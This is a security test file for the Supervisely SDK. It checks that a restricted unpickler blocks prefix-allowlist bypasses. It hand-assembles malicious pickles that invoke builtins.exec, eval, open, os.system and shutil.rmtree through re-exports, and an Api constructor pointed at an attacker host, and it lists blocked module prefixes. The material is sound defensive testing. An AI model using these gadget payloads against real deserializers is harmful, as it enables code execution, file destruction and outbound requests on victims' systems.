"""Security tests for F8: restricted-unpickler prefix-allowlist bypass (CWE-502).

``Project.upload_bin`` (and Data Version restore of a ``.bin`` backup) deserializes
an attacker-reachable file with :class:`supervisely.project.project.CustomUnpickler`,
whose allowlist is a set of *module prefixes* (``supervisely``, ``builtins``,
``collections``, ``_collections``, ``datetime``).

Before the fix, :class:`~supervisely.io.fs.BaseRestrictedUnpickler` returned *any*
name resolved under an allowed prefix.  Because pickle resolves a dotted name by
attribute traversal and then *calls whatever it is handed*, that allowed an
attacker to reach:

* every builtin, including ``exec`` / ``eval`` / ``open`` / ``getattr`` /
  ``__import__`` (``builtins`` is an allowed prefix);
* any name re-exported inside a ``supervisely`` module -- e.g. module
  ``supervisely.io.fs`` imports ``os`` / ``subprocess`` / ``shutil``, so
  ``supervisely.io.fs`` + ``os.system`` resolves to ``os.system``,
  ``+ subprocess.Popen`` to the ``Popen`` class, ``+ shutil.rmtree`` to that
  function, and ``+ os`` to the ``os`` module object;
* plain functions defined inside ``supervisely`` (``supervisely.io.fs.silent_remove``,
  ``mkdir``, ...).

i.e. arbitrary code execution and arbitrary file writes/deletes when a model app
is deployed as root inside a Linux container.

The fix makes a prefix match return the resolved object only when it is a *class*
(``isinstance(obj, type)``) whose own ``__module__`` is itself an allowed module,
and for ``builtins`` only the plain data types in ``_SAFE_BUILTINS``.  Functions,
module objects and re-exports are therefore blocked, while the legitimate payload
of a backup -- class references such as ``supervisely.geometry.rectangle.Rectangle``,
``datetime.datetime``, ``collections.OrderedDict`` -- still loads.

A class is still *called* by pickle (REDUCE / NEWOBJ), so a class whose constructor
does something is a gadget too: ``supervisely.api.api.Api(server_address, ...,
check_instance_version=True)`` issued an outbound HTTP request to an attacker-chosen
host.  ``CustomUnpickler._BLOCKED_MODULE_PREFIXES`` therefore carves the packages that
connect, run or write something (``supervisely.api.api``, ``.app``, ``.cli``, ``.io``,
``.nn``, ``.sly_logger``, ``.task``) out of the ``supervisely`` prefix; both the
requested module and the class's own ``__module__`` are checked, so a re-export such
as ``supervisely.Api`` is refused as well.

The exact-allowlist path (``_BlobOffsetUnpickler`` in ``supervisely/api/image_api.py``)
is unchanged and is covered here as a regression guard.

Vulnerability tests build the malicious pickle by hand (or via ``__reduce__``),
drive the *real* deserializer ``CustomUnpickler`` and the real public entry point
``Project.upload_bin`` (api mocked), and assert the harmful side effect did not
happen.  They FAIL on the pre-fix BASE tree and PASS on the fixed tree.  Every
side effect an exploit could produce is aimed inside ``tmp_path``; no real network
is used.

Style follows the finished files in tests/security (plain functions, pytest
fixtures, tmp_path).
"""

import datetime
import importlib
import io
import os
import pickle
from collections import OrderedDict, defaultdict
from pathlib import Path
from unittest import mock

import pytest
import requests

import supervisely as sly
from supervisely.api.api import Api
from supervisely.api.dataset_api import DatasetInfo
from supervisely.api.entity_annotation.figure_api import FigureInfo
from supervisely.api.image_api import BlobImageInfo, ImageInfo, _BlobOffsetUnpickler
from supervisely.api.project_api import ProjectInfo
from supervisely.geometry.graph import KeypointsTemplate
from supervisely.project.project import CustomUnpickler, Project

# ---------------------------------------------------------------------------
# hand-assembled pickle opcodes (protocol 4) -- needed to forge an exact
# ``module`` + ``name`` pair that ``pickle.dumps`` would never emit on its own
# (a dotted ``name`` resolved against a re-exporting module, or a bare builtin).
# ---------------------------------------------------------------------------

PROTO = b"\x80"
SHORT_BINUNICODE = b"\x8c"
STACK_GLOBAL = b"\x93"
TUPLE1 = b"\x85"
TUPLE2 = b"\x86"
MARK = b"("
TUPLE = b"t"
REDUCE = b"R"
NEWOBJ = b"\x81"
STOP = b"."
BININT1 = b"K"
NONE = b"N"


def _u(s: str) -> bytes:
    """SHORT_BINUNICODE opcode for a short (<256 byte) string."""
    b = s.encode("utf-8")
    assert len(b) < 256
    return SHORT_BINUNICODE + bytes([len(b)]) + b


def _global(module: str, name: str) -> bytes:
    """STACK_GLOBAL: pushes the object resolved as ``module``/``name``."""
    return _u(module) + _u(name) + STACK_GLOBAL


def _resolve(module: str, name: str) -> bytes:
    """A pickle that merely resolves ``module``/``name`` and returns it.

    Resolution alone is the attack for a callable/module whose mere possession
    is the primitive (the unpickler hands the attacker ``exec`` / ``Popen`` / the
    ``os`` module); ``find_class`` is still invoked, so the fix must reject it.
    """
    return PROTO + b"\x04" + _global(module, name) + STOP


def _reduce1(module: str, name: str, arg: str) -> bytes:
    """A pickle equivalent to ``module.name(arg)`` -- a single-string-arg call."""
    return PROTO + b"\x04" + _global(module, name) + _u(arg) + TUPLE1 + REDUCE + STOP


def _reduce2(module: str, name: str, a1: str, a2: str) -> bytes:
    """A pickle equivalent to ``module.name(a1, a2)``."""
    return PROTO + b"\x04" + _global(module, name) + _u(a1) + _u(a2) + TUPLE2 + REDUCE + STOP


def _reduce_via_dumps(func, args, protocol: int = 4) -> bytes:
    """Pickle a ``(func, args)`` REDUCE using the standard pickler.

    ``func`` must be importable by reference (e.g. ``supervisely.io.fs.silent_remove``);
    ``pickle`` emits its real defining ``module``/``name``.  The throwaway holder is
    represented purely by its ``__reduce__`` result, so it never appears in the stream.
    """

    class _Payload:
        def __reduce__(self):
            return (func, args)

    return pickle.dumps(_Payload(), protocol=protocol)


def _blocked(data: bytes, unpickler_cls=CustomUnpickler) -> bool:
    """Load ``data`` with the restricted unpickler.

    Returns ``True`` if it was rejected with :exc:`pickle.UnpicklingError`
    (the safe outcome), ``False`` if it loaded without being blocked.  Any other
    exception propagates -- a genuine test failure.
    """
    try:
        unpickler_cls(io.BytesIO(data)).load()
        return False
    except pickle.UnpicklingError:
        return True


def _touch_cmd(marker: Path) -> str:
    """Shell command that creates ``marker`` -- used as the os.system payload so
    the attack is observable on the BASE tree on either OS."""
    if os.name == "nt":
        return 'type nul > "%s"' % marker
    return ": > '%s'" % marker


# ===========================================================================
# vulnerability tests -- FAIL on BASE, PASS on FIXED
# ===========================================================================
#
# code-execution builtins reached through the ``builtins`` prefix
# ---------------------------------------------------------------------------


def test_builtins_exec_blocked(tmp_path: Path):
    """``builtins.exec(<python>)`` must not run during deserialization."""
    marker = tmp_path / "exec_pwned.txt"
    code = "open(r'%s', 'w').close()" % marker
    data = _reduce1("builtins", "exec", code)

    was_blocked = _blocked(data)

    assert not marker.exists(), "builtins.exec ran arbitrary code during unpickling"
    assert was_blocked, "builtins.exec was not blocked by the restricted unpickler"


def test_builtins_eval_blocked(tmp_path: Path):
    """``builtins.eval(<expr>)`` must not run during deserialization."""
    marker = tmp_path / "eval_pwned.txt"
    code = "open(r'%s', 'w').close()" % marker
    data = _reduce1("builtins", "eval", code)

    was_blocked = _blocked(data)

    assert not marker.exists(), "builtins.eval evaluated attacker code during unpickling"
    assert was_blocked, "builtins.eval was not blocked by the restricted unpickler"


def test_builtins_open_blocked(tmp_path: Path):
    """``builtins.open(path, 'w')`` must not create an attacker-chosen file."""
    marker = tmp_path / "open_pwned.txt"
    data = _reduce2("builtins", "open", str(marker), "w")

    was_blocked = _blocked(data)

    assert not marker.exists(), "builtins.open created an attacker-chosen file"
    assert was_blocked, "builtins.open was not blocked by the restricted unpickler"


@pytest.mark.parametrize("name", ["getattr", "__import__"])
def test_builtins_callable_resolution_blocked(name):
    """Merely *resolving* ``builtins.getattr`` / ``builtins.__import__`` hands the
    attacker a code-execution primitive, so the unpickler must reject it."""
    assert _blocked(_resolve("builtins", name)), f"builtins.{name} was resolvable"


# names re-exported inside an allowed ``supervisely`` module
# ---------------------------------------------------------------------------


def test_supervisely_reexport_os_system_blocked(tmp_path: Path):
    """``supervisely.io.fs`` imports ``os``; ``+ 'os.system'`` resolved to the real
    ``os.system`` on BASE and executed a shell command.  Must be blocked now."""
    marker = tmp_path / "os_system_pwned.txt"
    data = _reduce1("supervisely.io.fs", "os.system", _touch_cmd(marker))

    was_blocked = _blocked(data)

    assert not marker.exists(), "os.system (via supervisely.io.fs re-export) ran a shell command"
    assert was_blocked, "supervisely.io.fs + 'os.system' was not blocked"


def test_supervisely_reexport_subprocess_popen_blocked():
    """``supervisely.io.fs`` + ``subprocess.Popen`` resolves to the ``Popen`` *class*.

    This specifically exercises the fix's ``__module__`` check: ``Popen`` IS a class
    (so the ``isinstance(obj, type)`` gate passes) but is defined in ``subprocess``,
    which is not an allowed module, so it must still be rejected."""
    assert _blocked(
        _resolve("supervisely.io.fs", "subprocess.Popen")
    ), "subprocess.Popen was obtainable through a supervisely re-export"


def test_supervisely_reexport_shutil_rmtree_blocked(tmp_path: Path):
    """``supervisely.io.fs`` + ``shutil.rmtree`` deleted an attacker-chosen tree on BASE."""
    victim = tmp_path / "victim_tree"
    (victim / "sub").mkdir(parents=True)
    (victim / "keep.txt").write_bytes(b"important")
    data = _reduce1("supervisely.io.fs", "shutil.rmtree", str(victim))

    was_blocked = _blocked(data)

    assert victim.exists(), "shutil.rmtree (via re-export) deleted a tree outside the allowlist"
    assert was_blocked, "supervisely.io.fs + 'shutil.rmtree' was not blocked"


def test_supervisely_reexport_module_object_blocked():
    """``supervisely.io.fs`` + ``os`` resolves to the ``os`` *module object* (not a
    class), which the fix must reject."""
    assert _blocked(
        _resolve("supervisely.io.fs", "os")
    ), "the os module object was obtainable through a supervisely re-export"


# plain functions actually defined inside supervisely
# ---------------------------------------------------------------------------


def test_supervisely_function_silent_remove_blocked(tmp_path: Path):
    """``supervisely.io.fs.silent_remove`` is a real function under an allowed
    prefix; constructing a REDUCE against it deleted an attacker-chosen file on BASE."""
    victim = tmp_path / "victim.txt"
    victim.write_bytes(b"keep me")
    data = _reduce_via_dumps(sly.io.fs.silent_remove, (str(victim),))

    was_blocked = _blocked(data)

    assert victim.exists(), "supervisely.io.fs.silent_remove deleted an attacker-chosen file"
    assert was_blocked, "a plain supervisely function (silent_remove) was not blocked"


def test_supervisely_function_mkdir_blocked(tmp_path: Path):
    """``supervisely.io.fs.mkdir`` is a real function under an allowed prefix;
    a REDUCE against it created an attacker-chosen directory on BASE."""
    marker_dir = tmp_path / "mkdir_pwned"
    data = _reduce_via_dumps(sly.io.fs.mkdir, (str(marker_dir),))

    was_blocked = _blocked(data)

    assert not marker_dir.exists(), "supervisely.io.fs.mkdir created an attacker-chosen directory"
    assert was_blocked, "a plain supervisely function (mkdir) was not blocked"


# the real public entry point: Project.upload_bin
# ---------------------------------------------------------------------------


def test_upload_bin_rejects_malicious_backup(tmp_path: Path):
    """Drive the *real* ``Project.upload_bin`` with a malicious ``.bin``.

    ``upload_bin`` opens the file and runs ``CustomUnpickler(f).load()`` before any
    API call, so a MagicMock api is never reached.  On BASE the embedded
    ``builtins.exec`` payload runs (writes the marker) and the subsequent tuple
    unpacking raises; on FIXED the load is rejected and the marker never appears.
    """
    marker = tmp_path / "upload_bin_pwned.txt"
    code = "open(r'%s', 'w').close()" % marker
    bin_path = tmp_path / "evil.bin"
    bin_path.write_bytes(_reduce1("builtins", "exec", code))

    api = mock.MagicMock(name="api")
    with pytest.raises(Exception):
        Project.upload_bin(api, str(bin_path), workspace_id=1)

    assert not marker.exists(), "Project.upload_bin executed code embedded in the backup"
    api.project.create.assert_not_called()


# SDK classes whose construction has side effects (blocked module prefixes)
# ---------------------------------------------------------------------------


class _FakeResp:
    def json(self):
        return {"version": "6.9.13"}


def test_api_construction_gadget_blocked(monkeypatch):
    """A REDUCE against ``supervisely.api.api.Api`` must be refused before Api is built.

    On BASE ``Api`` resolved (a class defined in ``supervisely``) and pickle called it;
    with ``check_instance_version=True`` and an attacker-chosen ``server_address`` the
    restore issued an outbound request to that host.  Now ``supervisely.api.api`` is a
    blocked prefix, so ``find_class`` raises :exc:`pickle.UnpicklingError` and nothing
    is sent.  Network is recorded at the SDK level (``Api.post``) and the HTTP-library
    level (``requests.Session.request``), so no real host is contacted on either tree.
    """
    calls = []

    def _record_post(self, method, data, *a, **k):
        calls.append(("Api.post", self.server_address, method))
        return _FakeResp()

    def _record_request(self, method, url, *a, **k):
        calls.append(("requests", method, url))
        raise requests.ConnectionError("network is disabled in this test")

    monkeypatch.setattr(Api, "post", _record_post)
    monkeypatch.setattr(requests.Session, "request", _record_request)

    # positional: server_address, token, retry_count, retry_sleep_sec,
    #             external_logger, ignore_task_id, api_server_address, check_instance_version
    data = _reduce_via_dumps(
        Api,
        ("http://attacker.invalid", "x" * 128, 1, 0, None, True, None, True),
    )

    error = None
    try:
        CustomUnpickler(io.BytesIO(data)).load()
    except pickle.UnpicklingError as exc:
        error = exc

    assert not calls, (
        "deserializing a .bin constructed an Api pointed at an attacker host and "
        f"attempted an outbound request: {calls}"
    )
    assert isinstance(error, pickle.UnpicklingError), "Api construction via REDUCE was not blocked"
    assert "supervisely.api.api.Api" in str(error)


# Mirrors CustomUnpickler._BLOCKED_MODULE_PREFIXES. Hardcoded (not read from the class)
# so this file also collects on the pre-fix tree.
_BLOCKED_PREFIXES = (
    "supervisely.api.api",
    "supervisely.app",
    "supervisely.cli",
    "supervisely.io",
    "supervisely.nn",
    "supervisely.sly_logger",
    "supervisely.task",
)


@pytest.mark.parametrize(
    "module, name",
    [
        ("supervisely.api.api", "Api"),  # outbound HTTP on construction
        ("supervisely", "Api"),  # same class via the allowed top-level re-export
        ("supervisely.app.content", "StateJson"),
        ("supervisely.cli.release.release", "cd"),  # chdir context manager
        ("supervisely.io.fs_cache", "FileCache"),
        ("supervisely.nn.prediction_dto", "PredictionBBox"),
        ("supervisely.sly_logger", "EventType"),
        ("supervisely.task.progress", "Progress"),
    ],
)
def test_blocked_prefix_classes_refused(module, name):
    """Real classes defined under a blocked prefix are refused, although they live under
    the allowed ``supervisely`` prefix.  The data classes a backup holds keep loading
    (see ``test_realistic_backup_roundtrip``)."""
    cls = getattr(importlib.import_module(module), name)
    assert isinstance(cls, type), f"{module}.{name} is not a class; pick another sample"
    assert any(
        cls.__module__ == p or cls.__module__.startswith(p + ".") for p in _BLOCKED_PREFIXES
    ), f"{module}.{name} is defined in {cls.__module__}, outside the blocked prefixes"

    assert _blocked(_resolve(module, name)), f"{module}.{name} (from a blocked prefix) loaded"


# ===========================================================================
# regression tests -- legitimate behaviour, PASS on BOTH trees
# ===========================================================================
#
# a realistic Project.download_bin payload round-trips unchanged
# ---------------------------------------------------------------------------


def _build_full_meta() -> sly.ProjectMeta:
    """A ProjectMeta holding ObjClasses of every image geometry the SDK offers and
    TagMetas of every value type."""
    kp = KeypointsTemplate()
    kp.add_point("nose", 10, 10)
    kp.add_point("tail", 20, 20)
    kp.add_edge("nose", "tail")

    classes = [
        sly.ObjClass("rect", sly.Rectangle, color=[1, 2, 3], hotkey="r", description="a box"),
        sly.ObjClass("poly", sly.Polygon, color=[4, 5, 6]),
        sly.ObjClass("bmp", sly.Bitmap, color=[7, 8, 9]),
        sly.ObjClass("alpha", sly.AlphaMask, color=[10, 11, 12]),
        sly.ObjClass("line", sly.Polyline, color=[13, 14, 15]),
        sly.ObjClass("pt", sly.Point, color=[16, 17, 18]),
        sly.ObjClass("cub", sly.Cuboid, color=[19, 20, 21]),
        sly.ObjClass("graph", sly.GraphNodes, geometry_config=kp, color=[22, 23, 24]),
        sly.ObjClass("c2d", sly.Cuboid2d, color=[25, 26, 27]),
        sly.ObjClass("any", sly.AnyGeometry, color=[28, 29, 30]),
    ]
    tags = [
        sly.TagMeta("t_none", sly.TagValueType.NONE),
        sly.TagMeta(
            "t_num",
            sly.TagValueType.ANY_NUMBER,
            applicable_to=sly.TagApplicableTo.OBJECTS_ONLY,
        ),
        sly.TagMeta(
            "t_str",
            sly.TagValueType.ANY_STRING,
            applicable_to=sly.TagApplicableTo.IMAGES_ONLY,
        ),
        sly.TagMeta(
            "t_oneof",
            sly.TagValueType.ONEOF_STRING,
            possible_values=["a", "b", "c"],
            applicable_classes=["rect", "poly"],
            color=[200, 100, 0],
            hotkey="o",
        ),
    ]
    settings = sly.ProjectSettings(
        multiview_enabled=True, multiview_tag_name="t_str", multiview_is_synced=False
    )
    return sly.ProjectMeta(
        obj_classes=classes,
        tag_metas=tags,
        project_type=sly.ProjectType.IMAGES,
        project_settings=settings,
    )


def _build_backup_payload():
    """Exactly the tuple shape ``Project.download_bin`` produces:
    (ProjectInfo, ProjectMeta, [DatasetInfo], [ImageInfo], {image_id: [FigureInfo]},
     {figure_id: [dict]})."""
    meta = _build_full_meta()
    custom_data = {
        "dt": datetime.datetime(2021, 3, 2, 10, 4, 33, 973000),
        "date": datetime.date(2020, 1, 1),
        "time": datetime.time(1, 2, 3),
        "td": datetime.timedelta(days=1, seconds=5),
        "set": {1, 2, 3},
        "frozenset": frozenset({"x", "y"}),
        "od": OrderedDict([("k1", 1), ("k2", 2)]),
        "dd": defaultdict(list, {"a": [1, 2]}),
        "bytes": b"\x00\x01\x02\xff",
        "bytearray": bytearray(b"abc"),
        "ptype": sly.ProjectType.VIDEOS,
    }
    project_info = ProjectInfo(
        1, "proj", "desc", 10, "readme", 2, 3, 3, 1, "2021", "2021", "images",
        "url", custom_data, {}, 5, {"multiview": {}}, {}, {"version": 2}, 9,
    )
    dataset_info = DatasetInfo(
        7, "ds", "dsdesc", 100, 1, 3, 3, "2021", "2021", "url", 5, 2, None, {"x": 1}, 9
    )
    image_info = ImageInfo(
        70, "a.jpg", None, "hash", "image/jpeg", "jpeg", 100, 64, 48, 1, 7,
        "2021", "2021", {"customSort": "z"}, "/p", "http://u", [{"tagId": 1}], "admin",
    )
    figure_info = FigureInfo(
        11, 1, "2021", "2021", 70, None, 1, 7, 0, "rectangle",
        {"points": {"exterior": [[0, 0], [5, 5]], "interior": []}},
        {"bbox": [0, 0, 5, 5]}, [], {}, "25",
    )
    figures = {70: [figure_info]}
    alpha_geometries = {11: [{"data": "base64..."}]}
    return (project_info, meta, [dataset_info], [image_info], figures, alpha_geometries)


# download_bin writes with pickle's default protocol (5 on Py>=3.8). Protocols 3-5
# all carry this payload losslessly; protocol 2 is covered separately below.
@pytest.mark.parametrize("protocol", [3, 4, 5])
def test_realistic_backup_roundtrip(protocol):
    """A full download_bin-shaped backup survives CustomUnpickler unchanged."""
    payload = _build_backup_payload()
    data = pickle.dumps(payload, protocol=protocol)

    loaded = CustomUnpickler(io.BytesIO(data)).load()

    p_in, m_in, d_in, i_in, f_in, a_in = payload
    p_out, m_out, d_out, i_out, f_out, a_out = loaded

    # NamedTuples compare by value
    assert p_out == p_in
    assert d_out == d_in
    assert i_out == i_in
    assert f_out == f_in
    assert a_out == a_in
    # ProjectMeta: every ObjClass (all geometry types) and TagMeta survived
    assert m_out.to_json() == m_in.to_json()
    assert len(m_out.obj_classes) == 10
    assert len(m_out.tag_metas) == 4
    # the exotic values inside custom_data
    cd = p_out.custom_data
    assert cd["dt"] == datetime.datetime(2021, 3, 2, 10, 4, 33, 973000)
    assert cd["date"] == datetime.date(2020, 1, 1)
    assert cd["td"] == datetime.timedelta(days=1, seconds=5)
    assert cd["set"] == {1, 2, 3}
    assert cd["frozenset"] == frozenset({"x", "y"})
    assert isinstance(cd["od"], OrderedDict) and cd["od"] == OrderedDict([("k1", 1), ("k2", 2)])
    assert isinstance(cd["dd"], defaultdict) and cd["dd"]["missing"] == []
    assert cd["bytes"] == b"\x00\x01\x02\xff"
    assert cd["bytearray"] == bytearray(b"abc")
    assert cd["ptype"] is sly.ProjectType.VIDEOS


@pytest.mark.parametrize(
    "geometry_module, geometry_name",
    [
        ("supervisely.geometry.rectangle", "Rectangle"),
        ("supervisely.geometry.bitmap", "Bitmap"),
        ("supervisely.geometry.alpha_mask", "AlphaMask"),
        ("supervisely.geometry.polygon", "Polygon"),
        ("supervisely.geometry.polyline", "Polyline"),
        ("supervisely.geometry.point", "Point"),
        ("supervisely.geometry.cuboid", "Cuboid"),
        ("supervisely.geometry.graph", "GraphNodes"),
        ("supervisely.geometry.cuboid_2d", "Cuboid2d"),
        ("supervisely.geometry.any_geometry", "AnyGeometry"),
    ],
)
def test_geometry_class_references_still_load(geometry_module, geometry_name):
    """An ObjClass pickles a reference to its geometry *class*; the fix must still
    resolve those (they are classes defined in supervisely modules)."""
    assert not _blocked(_resolve(geometry_module, geometry_name)), (
        f"{geometry_module}.{geometry_name} is a legitimate backup class but was blocked"
    )


@pytest.mark.parametrize(
    "module, name",
    [
        ("datetime", "datetime"),
        ("datetime", "date"),
        ("datetime", "timedelta"),
        ("collections", "OrderedDict"),
        ("collections", "defaultdict"),
        ("supervisely.annotation.obj_class", "ObjClass"),
        ("supervisely.annotation.tag_meta", "TagMeta"),
        ("supervisely.project.project_meta", "ProjectMeta"),
        ("supervisely.api.image_api", "ImageInfo"),
    ],
)
def test_allowed_classes_still_load(module, name):
    """Representative classes from every allowed prefix still resolve."""
    assert not _blocked(_resolve(module, name)), f"{module}.{name} was wrongly blocked"


# The plain data-type builtins a backup legitimately contains. Hardcoded (not read
# from CustomUnpickler._SAFE_BUILTINS) so this file also collects on the pre-fix tree.
_SAFE_BUILTIN_TYPES = [
    "bool", "bytearray", "bytes", "complex", "dict", "float", "frozenset",
    "int", "list", "object", "range", "set", "slice", "str", "tuple",
]


@pytest.mark.parametrize("builtin_name", _SAFE_BUILTIN_TYPES)
def test_safe_builtins_still_load(builtin_name):
    """The plain data-type builtins on the allowlist still resolve (dict/list/... are
    everywhere in a backup)."""
    assert not _blocked(_resolve("builtins", builtin_name)), (
        f"safe builtin {builtin_name} was wrongly blocked"
    )


# NamedTuple field-count backward/forward compatibility of CustomUnpickler
# ---------------------------------------------------------------------------


def _newobj_imageinfo(values) -> bytes:
    """Hand-assembled ``ImageInfo.__new__(ImageInfo, *values)`` via the NEWOBJ opcode.

    NEWOBJ does not go through ``find_class`` for the constructor, so the compat
    ``__new__`` wrapper CustomUnpickler installs on ``*Info`` NamedTuples is what
    runs -- exactly the pickle shape a real NamedTuple produces.
    """
    body = PROTO + b"\x04" + _global("supervisely.api.image_api", "ImageInfo") + MARK
    for v in values:
        if v is None:
            body += NONE
        elif isinstance(v, int):
            assert 0 <= v < 256
            body += BININT1 + bytes([v])
        else:
            body += _u(v)
    body += TUPLE + NEWOBJ + STOP
    return body


def test_namedtuple_fewer_fields_compat():
    """A backup written by an older SDK with FEWER ImageInfo fields still loads;
    missing trailing fields are padded with defaults/None."""
    n = len(ImageInfo._fields)
    values = [7, "old.jpg", None, "hash", "image/jpeg", "jpeg", 100, 64, 48, 1]
    assert len(values) < n
    data = _newobj_imageinfo(values)

    loaded = CustomUnpickler(io.BytesIO(data)).load()

    assert isinstance(loaded, ImageInfo)
    assert loaded.id == 7
    assert loaded.name == "old.jpg"
    assert loaded.width == 64
    # a trailing field that was absent from the short tuple is backfilled
    assert loaded.offset_start is None


def test_namedtuple_more_fields_compat():
    """A backup written by a NEWER SDK with MORE ImageInfo fields still loads;
    extra trailing fields are dropped."""
    n = len(ImageInfo._fields)
    values = [5, "new.jpg"] + [0] * (n)  # n + 2 values total
    assert len(values) > n
    data = _newobj_imageinfo(values)

    loaded = CustomUnpickler(io.BytesIO(data)).load()

    assert isinstance(loaded, ImageInfo)
    assert loaded.id == 5
    assert loaded.name == "new.jpg"
    assert len(loaded) == n


# _BlobOffsetUnpickler (exact-allowlist path) is unchanged
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("protocol", [2, 3, 4, 5])
def test_blob_offset_unpickler_loads_blobimageinfo(protocol):
    """A list of BlobImageInfo still round-trips through _BlobOffsetUnpickler."""
    blobs = [BlobImageInfo("a.jpg", 0, 10), BlobImageInfo("b.jpg", 10, 20)]
    data = pickle.dumps(blobs, protocol=protocol)

    loaded = _BlobOffsetUnpickler(io.BytesIO(data)).load()

    assert loaded == blobs


def test_blob_offset_unpickler_blocks_other_supervisely_classes():
    """The offsets unpickler uses an *exact* allowlist (not prefixes), so even a
    legitimate-looking supervisely class such as ObjClass is rejected."""
    assert _blocked(
        _resolve("supervisely.annotation.obj_class", "ObjClass"), _BlobOffsetUnpickler
    )


def test_blob_offset_unpickler_blocks_code_execution(tmp_path: Path):
    """The offsets unpickler blocks builtins.exec just the same."""
    marker = tmp_path / "blob_exec_pwned.txt"
    code = "open(r'%s', 'w').close()" % marker
    data = _reduce1("builtins", "exec", code)

    was_blocked = _blocked(data, _BlobOffsetUnpickler)

    assert not marker.exists()
    assert was_blocked


# pre-existing cross-tree limitation (documented, not an F8 regression)
# ---------------------------------------------------------------------------


@pytest.mark.xfail(
    strict=True,
    reason="Pre-existing on BOTH trees (not introduced by F8): at pickle protocol 2 "
    "datetime/bytes/set/bytearray are encoded via the globals _codecs.encode and "
    "__builtin__.set/bytearray, which the restricted allowlist blocks. Project.download_bin "
    "writes with the default protocol (5), whose native opcodes need no such globals, so "
    "real backups are unaffected; this only bites a hand-made protocol-2 backup.",
)
@pytest.mark.parametrize(
    "obj",
    [datetime.datetime(2021, 1, 1), b"\x00\x01", {1, 2, 3}, bytearray(b"abc")],
)
def test_protocol2_legacy_globals_are_blocked(obj):
    """Documents that these common values cannot be restored from a protocol-2 pickle."""
    data = pickle.dumps(obj, protocol=2)
    loaded = CustomUnpickler(io.BytesIO(data)).load()
    assert loaded == obj
